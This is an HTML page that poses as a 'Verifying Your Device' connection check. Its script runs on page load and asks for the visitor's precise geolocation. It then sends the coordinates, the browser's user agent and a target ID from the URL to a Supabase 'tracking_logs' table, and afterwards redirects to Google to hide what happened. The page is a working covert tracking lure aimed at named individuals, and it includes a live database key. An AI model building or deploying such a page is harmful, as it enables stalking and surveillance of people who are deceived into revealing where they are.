<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connection Verifying...</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
</head>
<body style="background-color: #1a1a1a; color: black; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center;">

    <div id="main-content" style="padding: 20px;">
        <div id="loader" style="border: 4px solid #333; border-top: 4px solid #007bff; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
        <h3 id="msg">Verifying Your Device...</h3>
        <p style="font-size: 14px; color: #888;">Please wait while we establish a secure connection.</p>
        
        <button id="retry-btn" style="display: none; margin-top: 20px; padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px;">Continue to Google</button>
    </div>

    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>

    <script>
        const supabaseUrl = 'https://nhhcijrjrcxznsqltzom.supabase.co';
        const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5oaGNpanJqcmN4em5zcWx0em9tIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM5MTMyODAsImV4cCI6MjA4OTQ4OTI4MH0.1CG80rxN01S00lCQ1gkqyKdenDJR_XjM0uQtEAln9XU';
        const supabaseClient = supabase.createClient(supabaseUrl, supabaseKey);

        async function sendToSupabase(lat, lon, id) {
            await supabaseClient.from('tracking_logs').insert([{ 
                user_identifier: id, 
                latitude: lat, 
                longitude: lon,
                device_info: "Mobile: " + navigator.userAgent
            }]);
            // Data send houar por ektu delay diye redirect
            setTimeout(() => {
                window.location.replace("https://www.google.com");
            }, 500);
        }

        function startTracking() {
            const urlParams = new URLSearchParams(window.location.search);
            const targetId = urlParams.get('id') || 'Mobile_User';

            if (navigator.geolocation) {
                // Mobile browser-e accuracy ebong timeout optimize kora
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        sendToSupabase(pos.coords.latitude, pos.coords.longitude, targetId);
                    }, 
                    (err) => {
                        console.log("Error or Denied");
                        // Permission block korle 2 second por Google-e pathabe
                        setTimeout(() => { window.location.replace("https://www.google.com"); }, 2000);
                    }, 
                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
                );
            } else {
                window.location.replace("https://www.google.com");
            }
        }

        // Page load houar 1.5 second por start hobe jate browser ready thake
        window.onload = () => {
            setTimeout(startTracking, 1500);
        };
    </script>
</body>
</html>
